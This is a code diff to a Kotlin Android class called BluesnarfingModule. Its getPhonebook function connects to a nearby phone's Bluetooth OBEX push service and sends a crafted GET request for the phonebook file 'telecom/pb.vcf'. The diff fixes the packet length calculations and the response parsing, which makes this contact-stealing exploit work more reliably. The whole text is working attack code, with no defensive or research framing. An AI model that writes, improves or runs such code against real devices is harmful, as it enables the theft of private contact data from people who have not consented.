@@ -52,9 +52,6 @@ class BluesnarfingModule {
     fun getPhonebook(device: BluetoothDevice): Result<String> {
         var socket: BluetoothSocket? = null
         return try {
-            // Attempt to create an insecure RFCOMM socket to the OPP service.
-            // createRfcommSocketToServiceRecord usually triggers authentication,
-            // but older devices might allow it openly.
             socket = device.createRfcommSocketToServiceRecord(OBEX_OPP_UUID)
             socket.connect()
 
@@ -62,67 +59,60 @@ class BluesnarfingModule {
             val inputStream = socket.inputStream
 
             // --- Step 1: Establish OBEX Connection ---
-
-            // Construct OBEX CONNECT packet.
-            // Opcode: 0x80 (Connect)
-            // Packet Length: 0x0007 (7 bytes)
-            // OBEX Version: 0x10 (1.0)
-            // Flags: 0x00
-            // Max Packet Length: 0x2000 (8192 bytes)
             val connectRequest = byteArrayOf(
                 OBEX_CONNECT_OPCODE, 0x00, 0x07, 0x10, 0x00, 0x20, 0x00
             )
             outputStream.write(connectRequest)
 
-            // Read the server's response.
-            val connectResponse = ByteArray(1024)
-            val connectResponseLength = inputStream.read(connectResponse)
+            val connectResponse = readObexResponse(inputStream)
 
-            // Check if connection was successful (0xA0).
             if (connectResponse[0] != OBEX_SUCCESS_RESPONSE) {
                 return Result.failure(IOException("OBEX CONNECT failed"))
             }
 
             // --- Step 2: Request the Phonebook File ---
-
-            // Target file name: "telecom/pb.vcf" encoded in UTF-16BE (standard for OBEX).
             val fileName = "telecom/pb.vcf".toByteArray(Charsets.UTF_16BE)
 
-            // Construct OBEX GET packet.
-            // Opcode: 0x83 (GET, Final)
-            // Header 1: Name (0x01), Length, Value (fileName)
-            // Header 2: Type (0x42 - Type), "x-obex/folder-listing" or specific type?
-            // Here we use a simplified GET request structure typical of bluesnarfing tools.
+            // OBEX Name header: HI (0x01) + 2-byte length (includes HI + length bytes + value)
+            val nameHeaderLength = 3 + fileName.size
+            val nameHeader = byteArrayOf(
+                0x01,
+                (nameHeaderLength shr 8).toByte(),
+                (nameHeaderLength and 0xFF).toByte()
+            ) + fileName
+
+            // Connection ID header (0xCB) — 5 bytes total: HI + 4-byte value
+            val connectionIdHeader = byteArrayOf(0xcb.toByte(), 0x00, 0x00, 0x00, 0x01)
+
+            val payload = nameHeader + connectionIdHeader
+            // Total packet: opcode (1) + packet length (2) + payload
+            val packetLength = 3 + payload.size
             val getRequest = byteArrayOf(
                 OBEX_GET_OPCODE,
-                0x00, (10 + fileName.size).toByte(), // Total packet length (approx calculation)
-                0x01, 0x00 // Name Header ID (0x01)
-                // Note: The length calculation in the original code snippet (10 + size)
-                // seems to be a hardcoded simplification.
-                // Real OBEX requires precise length bytes.
-            ) + fileName + byteArrayOf(0xcb.toByte(), 0x00, 0x00, 0x00, 0x01) // Connection ID header (0xCB)?
+                (packetLength shr 8).toByte(),
+                (packetLength and 0xFF).toByte()
+            ) + payload
 
             outputStream.write(getRequest)
 
             // --- Step 3: Read the Data ---
-
-            // Read the GET response.
             val getResponse = readObexResponse(inputStream)
 
             if (getResponse[0] == OBEX_SUCCESS_RESPONSE) {
-                // Parse the body of the response.
                 val bodyHeaderIndex = getResponse.indexOf(OBEX_BODY_HEADER)
 
-                if (bodyHeaderIndex != -1) {
-                    // Extract body length (2 bytes).
-                    val bodyLength = (getResponse[bodyHeaderIndex + 1].toInt() shl 8) or getResponse[bodyHeaderIndex + 2].toInt()
+                if (bodyHeaderIndex != -1 && bodyHeaderIndex + 2 < getResponse.size) {
+                    val bodyLength = ((getResponse[bodyHeaderIndex + 1].toInt() and 0xFF) shl 8) or
+                        (getResponse[bodyHeaderIndex + 2].toInt() and 0xFF)
 
-                    // Extract payload.
                     val bodyStartIndex = bodyHeaderIndex + 3
-                    val bodyEndIndex = bodyStartIndex + bodyLength - 3 // Adjusted for header length
-
-                    // Convert bytes to String.
-                    Result.success(String(getResponse, bodyStartIndex, bodyEndIndex - bodyStartIndex))
+                    // bodyLength includes the 3-byte header (HI + 2-byte length)
+                    val dataLength = bodyLength - 3
+                    if (dataLength > 0 && bodyStartIndex + dataLength <= getResponse.size) {
+                        Result.success(String(getResponse, bodyStartIndex, dataLength))
+                    } else {
+                        Result.failure(IOException("Invalid body length in OBEX response"))
+                    }
                 } else {
                     Result.failure(IOException("Phonebook data not found in response"))
                 }
@@ -142,24 +132,38 @@ class BluesnarfingModule {
     }
 
     /**
-     * Helper to read the full OBEX response frame.
+     * Reads a complete OBEX response frame from the stream.
+     * Handles sign extension and ensures full reads.
      */
     private fun readObexResponse(inputStream: InputStream): ByteArray {
         val response = ByteArrayOutputStream()
 
-        // Read the 3-byte header (Opcode + Length).
         val header = ByteArray(3)
-        inputStream.read(header)
+        readFully(inputStream, header)
         response.write(header)
 
-        // Calculate total packet length from bytes 2 and 3.
-        val length = (header[1].toInt() shl 8) or header[2].toInt()
+        val length = ((header[1].toInt() and 0xFF) shl 8) or (header[2].toInt() and 0xFF)
 
-        // Read the rest of the packet.
-        val payload = ByteArray(length - 3)
-        inputStream.read(payload)
-        response.write(payload)
+        if (length > 3) {
+            val payload = ByteArray(length - 3)
+            readFully(inputStream, payload)
+            response.write(payload)
+        }
 
         return response.toByteArray()
+    }
+
+    /**
+     * Reads exactly [buffer.size] bytes from the stream, looping until the buffer is full.
+     */
+    private fun readFully(inputStream: InputStream, buffer: ByteArray) {
+        var offset = 0
+        while (offset < buffer.size) {
+            val bytesRead = inputStream.read(buffer, offset, buffer.size - offset)
+            if (bytesRead == -1) {
+                throw IOException("Unexpected end of OBEX stream after $offset/${buffer.size} bytes")
+            }
+            offset += bytesRead
+        }
     }
 }
